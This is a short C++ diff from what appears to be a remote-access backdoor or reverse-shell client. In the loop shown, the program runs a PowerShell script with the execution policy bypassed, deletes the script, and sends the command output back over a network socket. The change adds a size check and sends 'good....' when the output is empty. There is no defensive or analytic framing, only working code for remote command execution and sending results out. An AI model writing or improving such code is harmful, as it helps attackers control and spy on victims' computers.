@@ -107,10 +107,18 @@ void main()
 					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
 					cout << result;
 
-					remove("test.ps1");
-					int sendResult = send(sock, result.c_str(), result.size(), 0);
-					result = "";
-					
+					if (result.size() > 0) {
+						remove("test.ps1");
+						int sendResult = send(sock, result.c_str(), result.size(), 0);
+						result = "";
+					}
+					else
+					{
+						result = "good....";
+						int sendResult = send(sock, result.c_str(), result.size(), 0);
+					}
+
+
 
 
 				}
